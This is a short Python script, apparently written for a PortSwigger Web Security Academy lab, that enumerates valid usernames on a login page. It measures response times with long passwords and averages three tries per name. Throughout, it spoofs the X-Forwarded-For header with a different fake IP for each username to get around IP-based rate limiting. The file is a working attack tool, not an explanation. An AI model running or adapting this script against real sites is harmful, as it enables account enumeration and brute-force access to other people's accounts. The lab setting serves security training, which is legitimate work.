from pathlib import Path

import requests

ROOT = Path(__file__).resolve().parent.parent
USERNAMES_FILE = ROOT / "wordlists" / "usernames.txt"

url = "https://0a7900e7047bef828050d05000560095.web-security-academy.net/login"

with open(USERNAMES_FILE, "r") as f:
    usernames = f.read().splitlines()

# 比較対象となる既知ユーザー wiener を先頭に置き、ベースラインとする
usernames = ["wiener"] + [username for username in usernames if username != "wiener"]
for i, username in enumerate(usernames):
    total_time = 0
    # 計測の安定化のために 3 回試行して平均を取る
    for j in range(3):
        data = {"username": username, "password": "A" * 100}

        # 同一IPによるレート制限を避けるためにユーザーごとに別の X-Forwarded-For を付与する
        fake_ip = f"{i}.1.1.1"
        headers = {"X-Forwarded-For": fake_ip}

        response = requests.post(url, data=data, headers=headers)
        total_time += response.elapsed.total_seconds()

    response_time = total_time / 3
    print(f"{username}:{response_time}")
